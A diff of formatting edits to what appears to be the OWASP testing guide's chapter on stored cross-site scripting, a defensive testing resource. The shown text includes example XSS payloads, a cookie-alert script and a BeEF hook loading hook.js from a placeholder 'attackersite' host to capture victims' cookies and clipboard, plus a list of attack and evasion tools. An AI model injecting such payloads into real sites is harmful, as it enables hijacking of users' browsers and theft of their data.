@@ -15,7 +15,7 @@ This vulnerability can be used to conduct a number of browser-based attacks incl
 - Hijacking another user's browser
 - Capturing sensitive information viewed by application users
 - Pseudo defacement of the application
-- Port scanning of internal hosts (“internal” in relation to the users of the web application)
+- Port scanning of internal hosts ("internal" in relation to the users of the web application)
 - Directed delivery of browser-based exploits
 - Other malicious activities
 
@@ -59,7 +59,7 @@ Input stored by the application is normally used in HTML tags, but it can also b
 
 **Note**: All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users.
 
-**Example**: Email stored data in index2.php
+**Example**: Email stored data in `index2.php`
 
 ![Stored Input Example](images/Stored_input_example.jpg)\
 *Figure 4.7.2-1: Stored Input Example*
@@ -94,7 +94,7 @@ Ensure the input is submitted through the application. This normally involves di
 > <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
 > ```
 >
-> The input is stored and the XSS payload is executed by the browser when reloading the page. If the input is escaped by the application, testers should test the application for XSS filters. For instance, if the string “SCRIPT” is replaced by a space or by a NULL character then this could be a potential sign of XSS filtering in action. Many techniques exist in order to evade input filters (see [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md)) chapter). It is strongly recommended that testers refer to [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) and [Mario](https://cybersecurity.wtf/encoder/) XSS Cheat pages, which provide an extensive list of XSS attacks and filtering bypasses. Refer to the whitepapers and tools section for more detailed information.
+> The input is stored and the XSS payload is executed by the browser when reloading the page. If the input is escaped by the application, testers should test the application for XSS filters. For instance, if the string "SCRIPT" is replaced by a space or by a NULL character then this could be a potential sign of XSS filtering in action. Many techniques exist in order to evade input filters (see [testing for reflected XSS](01-Testing_for_Reflected_Cross_Site_Scripting.md)) chapter). It is strongly recommended that testers refer to [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) and [Mario](https://cybersecurity.wtf/encoder/) XSS Cheat pages, which provide an extensive list of XSS attacks and filtering bypasses. Refer to the whitepapers and tools section for more detailed information.
 
 #### Leverage Stored XSS with BeEF
 
@@ -108,11 +108,13 @@ A typical BeEF exploitation scenario involves:
 
 The JavaScript hook can be injected by exploiting the XSS vulnerability in the web application.
 
-**Example**: BeEF Injection in index2.php:
+**Example**: BeEF Injection in `index2.php`:
 
-`aaa@aa.com”><script src=http://attackersite/hook.js></script>`
+```html
+aaa@aa.com"><script src=http://attackersite/hook.js></script>
+```
 
-When the user loads the page index2.php, the script hook.js is executed by the browser. It is then possible to access cookies, user screenshot, user clipboard, and launch complex XSS attacks.
+When the user loads the page `index2.php`, the script `hook.js` is executed by the browser. It is then possible to access cookies, user screenshot, user clipboard, and launch complex XSS attacks.
 
 > ![Beef Injection Example](images/RubyBeef.png)\
 > *Figure 4.7.2-3: Beef Injection Example*
@@ -125,7 +127,7 @@ If the web application allows file upload, it is important to check if it is pos
 
 Consider the following HTTP POST request for file upload:
 
-```html
+```http
 POST /fileupload.aspx HTTP/1.1
 […]
 Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
@@ -165,29 +167,22 @@ The following table summarizes some special variables and functions to look at w
 
 | **PHP**        | **ASP**           |  **JSP**         |
 |----------------|-------------------|------------------|
-| $_GET - HTTP GET variables  | Request.QueryString - HTTP GET | doGet, doPost servlets - HTTP GET and POST |
-| $_POST - HTTP POST variables| Request.Form - HTTP POST | request.getParameter - HTTP GET/POST variables |
-| $_REQUEST – HTTP POST, GET and COOKIE variables | Server.CreateObject - used to upload files |
-| $_FILES - HTTP File Upload variables |
+| `$_GET` - HTTP GET variables  | `Request.QueryString` - HTTP GET | `doGet`, `doPost` servlets - HTTP GET and POST |
+| `$_POST` - HTTP POST variables| `Request.Form` - HTTP POST | `request.getParameter` - HTTP GET/POST variables |
+| `$_REQUEST` – HTTP POST, GET and COOKIE variables | `Server.CreateObject` - used to upload files |
+| `$_FILES` - HTTP File Upload variables |
 
 **Note**: The table above is only a summary of the most important parameters but, all user input parameters should be investigated.
 
 ## Tools
 
-- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/)
-  PCE helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.
-- [Hackvertor](https://hackvertor.co.uk/public)
-  Hackvertor is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).
-- [BeEF](https://www.beefproject.com)
-  BeEF is the browser exploitation framework. A professional tool to demonstrate the real-time impact of browser vulnerabilities.
-- [XSS-Proxy](http://xss-proxy.sourceforge.net/)
-  XSS-Proxy is an advanced Cross-Site-Scripting (XSS) attack tool.
-- [Burp](https://portswigger.net/burp/)
-  Burp Proxy is an interactive HTTP/S proxy server for attacking and testing web applications.
-- [XSS Assistant](https://www.greasespot.net/)
-  Greasemonkey script that allow users to easily test any web application for cross-site-scripting flaws.
-- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org)
-  ZAP is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications. It is designed to be used by people with a wide range of security experience and as such is ideal for developers and functional testers who are new to penetration testing. ZAP provides automated scanners as well as a set of tools that allow you to find security vulnerabilities manually.
+- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.
+- [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).
+- [BeEF](https://www.beefproject.com) is the browser exploitation framework. A professional tool to demonstrate the real-time impact of browser vulnerabilities.
+- [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
+- [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.
+- [XSS Assistant](https://www.greasespot.net/) Greasemonkey script that allow users to easily test any web application for cross-site-scripting flaws.
+- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.
 
 ## References
 
@@ -197,13 +192,13 @@ The following table summarizes some special variables and functions to look at w
 
 ### Books
 
-- Joel Scambray, Mike Shema, Caleb Sima - “Hacking Exposed Web Applications”, Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
-- Dafydd Stuttard, Marcus Pinto - “The Web Application's Handbook - Discovering and Exploiting Security Flaws”, 2008, Wiley, ISBN 978-0-470-17077-9
-- Jeremiah Grossman, Robert “RSnake” Hansen, Petko “pdp” D. Petkov, Anton Rager, Seth Fogie - “Cross Site Scripting Attacks: XSS Exploits and Defense”, 2007, Syngress, ISBN-10: 1-59749-154-3
+- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
+- Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN 978-0-470-17077-9
+- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3
 
 ### Whitepapers
 
-- [CERT: “CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests”](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
-- [Amit Klein: “Cross-site Scripting Explained”](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)
-- [Gunter Ollmann: “HTML Code Injection and Cross-site Scripting”](http://www.technicalinfo.net/papers/CSS.html)
-- [CGISecurity.com: “The Cross Site Scripting FAQ”](https://www.cgisecurity.com/xss-faq.html)
+- [CERT: "CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests"](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
+- [Amit Klein: "Cross-site Scripting Explained"](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)
+- [Gunter Ollmann: "HTML Code Injection and Cross-site Scripting"](http://www.technicalinfo.net/papers/CSS.html)
+- [CGISecurity.com: "The Cross Site Scripting FAQ"](https://www.cgisecurity.com/xss-faq.html)
